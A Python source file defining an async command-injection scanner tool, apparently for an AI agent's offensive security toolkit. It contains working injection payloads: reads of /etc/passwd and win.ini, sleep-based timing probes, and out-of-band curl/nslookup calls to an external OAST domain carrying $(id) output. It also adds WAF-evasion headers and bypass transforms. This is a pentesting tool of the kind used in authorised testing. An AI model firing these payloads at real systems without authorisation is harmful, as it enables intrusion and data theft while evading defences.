import re
import urllib.parse
from src.sdk.tool import function_tool
from .common import (
    _detect_waf,
    _get_evasion_headers,
    _waf_transform_payloads,
    async_fetch_all,
    register_appsec_vulnerability,
    CMDI_PAYLOADS_ADVANCED,
)

@function_tool()
async def command_injection_scanner(
    url: str,
    parameter: str,
    method: str = "GET",
    cookies: str = "",
    oast_domain: str = "",
    os_hint: str = "",
) -> str:
    """
    Scan for OS Command Injection vulnerabilities (Async Engine).
    Tests for Reflected, Time-based, and OOB execution concurrently.
    
    Args:
        url: Target URL
        parameter: Parameter to inject into
        method: HTTP method (GET or POST)
        cookies: Session cookies
        oast_domain: Burp Collaborator / interactsh domain for OOB
        os_hint: Target OS hint (linux, windows, auto)
    
    Returns:
        Command injection scan results
    """
    out = [f"## Command Injection Scanner (Async Engine): {url}",
           f"Parameter: {parameter}",
           f"Method: {method.upper()}"]
           
    hdrs = _get_evasion_headers({"Cookie": cookies} if cookies else None)
    
    # ── Baseline ──
    baseline_req = {"method": method.upper(), "headers": hdrs}
    parsed = urllib.parse.urlparse(url)
    qparams = dict(urllib.parse.parse_qsl(parsed.query))
    
    if method.upper() == "POST":
        baseline_req["url"] = url
        baseline_req["data"] = {parameter: "CoPilotBaselineValue123"}
    else:
        qparams[parameter] = "CoPilotBaselineValue123"
        baseline_req["url"] = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(qparams)}"
        
    out.append("⏳ Fetching baseline profile...")
    try:
        baseline_responses = await async_fetch_all([baseline_req], max_concurrent=1, timeout_sec=10)
        baseline_resp = baseline_responses[0]
        baseline_body = baseline_resp["text"]
        baseline_time = baseline_resp["elapsed"]
    except Exception as e:
        return f"❌ Failed to fetch baseline: {e}"
        
    # ── Payloads ──
    linux_cmds = ["id", "whoami", "uname -a", "cat /etc/passwd"]
    windows_cmds = ["whoami", "hostname", "ver", "type C:\\windows\\win.ini"]
    
    _REFLECTED_PATTERNS = {
        "id":   r"uid=\d+\(|gid=\d+",
        "whoami": r"(root|www-data|apache|nginx|nobody|[a-z]+\\\\[a-z]+|[a-z_][a-z0-9_-]{0,31})",
        "uname -a": r"Linux\s+\S+\s+\d+\.\d+",
        "cat /etc/passwd": r"root:x:0:0:|daemon:x:1:1:|bin:x:2:2:",
        "hostname": r"\S+",
        "ver": r"Microsoft Windows|Version \d+\.\d+",
        "type C:\\windows\\win.ini": r"\[fonts\]|\[extensions\]",
    }
    
    operators = [";", "|", "||", "&", "&&", "`", "$("]
    
    test_linux = os_hint.lower() != "windows"
    test_windows = os_hint.lower() != "linux"
    
    base_payloads = []
    
    # Reflected Payloads
    if test_linux:
        for cmd in linux_cmds:
            for op in operators:
                base_payloads.append((f"test{op}{cmd}" if op not in ["`", "$("] else f"{op.replace('(', '')}{cmd}{'`' if op=='`' else ')'}", "reflected", cmd))
    if test_windows:
        for cmd in windows_cmds:
            for op in operators:
                base_payloads.append((f"test{op}{cmd}", "reflected", cmd))
                
    # Time payloads
    if test_linux:
        base_payloads.extend([
            (";sleep 5", "time", "sleep"),
            ("|sleep 5", "time", "sleep"),
            ("&&sleep 5", "time", "sleep"),
            ("$(sleep 5)", "time", "sleep")
        ])
    if test_windows:
        base_payloads.extend([
            ("&timeout /T 5", "time", "timeout"),
            ("|powershell sleep 5", "time", "timeout")
        ])

    # Advanced bypass payloads from shared library
    if test_linux:
        for _p in CMDI_PAYLOADS_ADVANCED["linux_bypass"]:
            base_payloads.append((_p, "reflected", "id"))
        for _p in CMDI_PAYLOADS_ADVANCED["polyglot"]:
            base_payloads.append((_p, "reflected", "id"))
    if test_windows:
        for _p in CMDI_PAYLOADS_ADVANCED["windows_bypass"]:
            base_payloads.append((_p, "reflected", "whoami"))

    # OOB payloads — actual DNS/HTTP callbacks for blind detection
    if oast_domain:
        oast_payloads = [
            (f";curl http://{oast_domain}/$(id)", "oast", "curl"),
            (f"|curl http://{oast_domain}/$(whoami)", "oast", "curl"),
            (f"$(curl http://{oast_domain}/)", "oast", "curl"),
            (f";nslookup {oast_domain}", "oast", "nslookup"),
            (f"|ping -c 1 {oast_domain}", "oast", "ping"),
            (f"&ping -n 1 {oast_domain}", "oast", "ping"),
            (f"`nslookup {oast_domain}`", "oast", "nslookup"),
            (f"$(nslookup {oast_domain})", "oast", "nslookup"),
        ]
        base_payloads.extend(oast_payloads)

    # Build requests
    waf_vendor, waf_conf = _detect_waf(url)
    
    async_requests = []
    for payload, ptype, cmd in base_payloads:
        transformed = _waf_transform_payloads([payload], "rce", url=url, waf_vendor=waf_vendor)
        for t_payload in transformed[:2]: # take up to 2 variants to keep requests reasonable
            req = {"method": method.upper(), "headers": hdrs, "_ptype": ptype, "_cmd": cmd, "_payload": t_payload}
            if method.upper() == "POST":
                req["url"] = url
                req["data"] = {parameter: t_payload}
            else:
                q = qparams.copy()
                q[parameter] = t_payload
                req["url"] = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(q)}"
            async_requests.append(req)
            
    out.append(f"🚀 Launching async swarm for {len(async_requests)} payloads...")
    scan_results = await async_fetch_all(async_requests, max_concurrent=20, timeout_sec=15)
    
    vulnerable = []
    delay_threshold = max(4.0, baseline_time * 3)
    
    for res in scan_results:
        if res["error"] and res["req"].get("_ptype") != "time":
            continue
            
        meta = res["req"]
        ptype = meta["_ptype"]
        cmd = meta["_cmd"]
        payload = meta["_payload"]
        elapsed = res["elapsed"]
        
        # Time check
        if ptype == "time" and elapsed >= delay_threshold and baseline_time < 2.0:
            vulnerable.append({
                "type": "Blind Command Injection (Time-based)",
                "payload": payload,
                "evidence": f"Delay of {elapsed:.1f}s (baseline {baseline_time:.1f}s)"
            })
            continue
            
        # Reflected check
        if ptype == "reflected" and not res["error"]:
            pattern = _REFLECTED_PATTERNS.get(cmd, "")
            if pattern:
                match = re.search(pattern, res["text"])
                if match and not re.search(pattern, baseline_body):
                    vulnerable.append({
                        "type": "Command Injection (Reflected)",
                        "payload": payload,
                        "evidence": f"Output matched pattern /{pattern}/ : {match.group(0)}"
                    })
                    
    # OAST check
    if oast_domain:
        out.append(f"\n🔔 OOB payloads sent to '{oast_domain}'. Check your Burp Collaborator / interactsh server for DNS/HTTP callbacks — any hit = blind RCE confirmed.")
        
    out.append("\n## Summary")
    if vulnerable:
        out.append(f"🔴 Found {len(vulnerable)} confirmed Command Injection vulnerabilities!")
        
        for v in vulnerable:
            out.append(f"  - Type: {v['type']}")
            out.append(f"    Payload: {v['payload']}")
            out.append(f"    Evidence: {v['evidence']}")
            
            await register_appsec_vulnerability(
                target_url=url,
                vuln_type=v["type"],
                severity="CRITICAL",
                parameter=parameter,
                payload=v["payload"],
                evidence=v["evidence"]
            )
    else:
        out.append("✅ No command injection detected.")
        
    return "\n".join(out)
